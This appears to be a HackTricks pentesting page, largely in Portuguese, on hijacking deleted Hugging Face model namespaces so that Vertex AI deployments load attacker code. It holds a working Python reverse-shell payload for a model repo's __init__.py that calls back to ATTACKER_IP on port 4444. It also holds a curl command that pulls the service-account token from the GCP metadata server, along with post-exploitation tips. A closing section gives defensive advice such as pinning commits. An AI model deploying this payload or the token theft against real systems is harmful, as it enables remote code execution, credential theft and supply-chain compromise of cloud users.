# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Cenário

- Vertex AI Model Garden permite a implantação direta de muitos modelos da Hugging Face (HF).
- Identificadores de modelo HF são Author/ModelName. Se um autor/org no HF for deletado, o mesmo nome de autor pode ser re-registrado por qualquer pessoa. Atacantes podem então criar um repo com o mesmo ModelName no caminho legado.
- Pipelines, SDKs, or cloud catalogs que buscam apenas pelo nome (sem pinning/integrity) puxarão o repo controlado pelo atacante. Quando o modelo é implantado, o loader code desse repo pode executar dentro do Vertex AI endpoint container, resultando em RCE com as permissões do endpoint.

Dois casos comuns de takeover no HF:
- Remoção do proprietário: o caminho antigo retorna 404 até que alguém re-registre o autor e publique o mesmo ModelName.
- Transferência de propriedade: o HF emite 307 redirects do antigo Author/ModelName para o novo autor. Se o autor antigo for posteriormente deletado e re-registrado por um atacante, a cadeia de redirects é quebrada e o repo do atacante responde no caminho legado.

## Identificando Namespaces Reutilizáveis (HF)

- Autor antigo deletado: a página do autor retorna 404; o caminho do modelo pode retornar 404 até o takeover.
- Modelos transferidos: o caminho antigo do modelo emite 307 para o novo proprietário enquanto o autor antigo existir. Se o autor antigo for depois deletado e re-registrado, o caminho legado resolverá para o repo do atacante.

Checagens rápidas com curl:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## End-to-end Attack Flow against Vertex AI

1) Descobrir namespaces de modelos reutilizáveis que o Model Garden lista como deployable:
- Encontrar modelos HF no Vertex AI Model Garden que ainda aparecem como “verified deployable”.
- Verificar no HF se o autor original foi deletado ou se o modelo foi transferido e o autor antigo foi posteriormente removido.

2) Re-registrar o autor deletado no HF e recriar o mesmo ModelName.

3) Publicar um repositório malicioso. Incluir código que execute no carregamento do modelo. Exemplos que comumente executam durante o model load do HF:
- Efeitos colaterais em __init__.py do repositório
- Arquivos modeling_*.py customizados ou código de processamento referenciado por config/auto_map
- Caminhos de código que requerem trust_remote_code=True em pipelines Transformers

4) Uma implantação do Vertex AI para o Author/ModelName legado agora puxa o repo do atacante. O loader é executado dentro do contêiner do endpoint do Vertex AI.

5) O payload estabelece acesso a partir do ambiente do endpoint (RCE) com as permissões do endpoint.

Exemplo de fragmento de payload executado na importação (apenas para demonstração):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Notas
- Loaders no mundo real variam. Muitas integrações Vertex AI HF clonam e importam repo modules referenciados pelo model’s config (e.g., auto_map), o que pode acionar execução de código. Alguns usos requerem trust_remote_code=True.
- O endpoint tipicamente roda em um container dedicado com escopo limitado, mas é um foothold inicial válido para data access e lateral movement em GCP.

## Post-Exploitation Tips (Vertex AI Endpoint)

Once code is running inside the endpoint container, consider:
- Enumerar environment variables e metadata em busca de credentials/tokens
- Acessar attached storage ou mounted model artifacts
- Interagir com Google APIs via service account identity (Document AI, Storage, Pub/Sub, etc.)
- Persistência no model artifact se a plataforma re-pulls o repo

Enumere instance metadata se acessível (dependente do container):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Orientações defensivas para usuários do Vertex AI

- Fixe os modelos por commit nos HF loaders para evitar substituição silenciosa:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Espelhe modelos HF verificados em um repositório/registro de artefatos interno confiável e implante a partir dele.
- Faça varreduras contínuas em codebases e configs por Author/ModelName hard-coded que foram deletados/transferidos; atualize para os novos namespaces ou fixe por commit.
- No Model Garden, verifique a proveniência do modelo e a existência do author antes da implantação.

## Heurísticas de Reconhecimento (HTTP)

- Deleted author: author page 404; legacy model path 404 until takeover.
- Transferred model: legacy path 307 to new author while old author exists; if old author later deleted and re-registered, legacy path serves attacker content.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Referências Cruzadas

- Veja a metodologia mais ampla e notas sobre supply-chain:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Referências

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
